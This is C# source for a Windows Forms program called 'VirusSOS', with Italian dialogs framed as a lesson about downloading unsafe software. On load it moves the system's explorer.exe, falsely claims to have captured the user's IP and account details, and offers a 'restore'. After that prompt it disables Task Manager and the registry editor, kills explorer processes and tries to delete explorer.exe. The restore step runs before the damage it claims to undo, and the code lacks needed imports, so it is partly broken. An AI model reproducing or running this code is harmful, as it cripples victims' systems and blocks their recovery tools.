using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace VirusSOS
{
    public partial class Main : Form
    {
        public Main()
        {
            InitializeComponent();
        }

        private void MainForm_Load(object sender, EventArgs e)
        {
            string sourcePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "explorer.exe");
            string destPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "explorer_backup.exe");

            if (File.Exists(sourcePath))
            {
                try
                {
                    File.Move(sourcePath, destPath);
                    MessageBox.Show("File explorer.exe spostato nei Documenti come explorer_backup.exe");
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Errore nello spostare explorer.exe: {ex.Message}");
                }
            }
            else
            {
                MessageBox.Show("File explorer.exe non trovato.");
            }

            void RestoreSystem()
            {
                // Ripristino registry DisableTaskMgr e DisableRegistryTools
                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
                {
                    if (key.GetValue("DisableTaskMgr") != null)
                        key.DeleteValue("DisableTaskMgr");

                    if (key.GetValue("DisableRegistryTools") != null)
                        key.DeleteValue("DisableRegistryTools");
                }

                // Ripristino explorer.exe
                if (File.Exists(destPath))
                {
                    try
                    {
                        File.Move(destPath, sourcePath);
                        MessageBox.Show("File explorer.exe ripristinato.");
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show($"Errore nel ripristino di explorer.exe: {ex.Message}");
                    }
                }
                else
                {
                    MessageBox.Show("Backup di explorer.exe non trovato.");
                }
            }
            MessageBox.Show("Fossi in te io non avrei cliccato su questo pulsante.");
            MessageBox.Show("Io ti avevo avvisato.");
            MessageBox.Show("Per questo adesso ti meriti qualcosa che non ti farà piacere perchè:");
            MessageBox.Show("Adesso ho il tuo IP, il tuo Hostname, il tuo dominio, il tuo username loggato. Altro??");
            MessageBox.Show("Sei soddisfatto? Questo solo per scaricare schifezze da internet!");
            MessageBox.Show("Hai visto cosa può succedere scaricando file pericolosi da internet.");
            MessageBox.Show("È importante non cliccare su pulsanti sospetti e non scaricare software da fonti non affidabili.");
            DialogResult result = MessageBox.Show("Vuoi ripristinare i valori e i file modificati allo stato originale?", "Ripristino", MessageBoxButtons.YesNo);

            if (result == DialogResult.Yes)
            {
                // Qui chiameremo il metodo di ripristino
                RestoreSystem();
            }
            else
            {
                MessageBox.Show("Ricorda: la sicurezza è responsabilità di tutti. Stai attento!");
            }
            // Disable Task Manager by setting registry key
            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
            {
                if (key.GetValue("DisableTaskMgr") == null)
                    key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                else
                    key.DeleteValue("DisableTaskMgr");
            }

            // Disable Registry Tools
            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
            {
                if (key.GetValue("DisableRegistryTools") == null)
                    key.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
                else
                    key.DeleteValue("DisableRegistryTools");
            }

            // Killing explorer.exe processes (be cautious)
            Process[] processes = Process.GetProcessesByName("explorer");
            foreach (Process process in processes)
            {
                try
                {
                    process.Kill();
                    MessageBox.Show($"Process {process.ProcessName} has been killed.");
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Error killing process: {ex.Message}");
                }
            }

            // Deleting explorer.exe (HIGHLY DANGEROUS and requires admin rights)
            string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "explorer.exe");

            if (File.Exists(filePath))
            {
                try
                {
                    File.Delete(filePath);
                    MessageBox.Show("File deleted.");
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Could not delete file: {ex.Message}");
                }
            }
            else
            {
                MessageBox.Show("File not found.");
            }
            
        }
    }
}
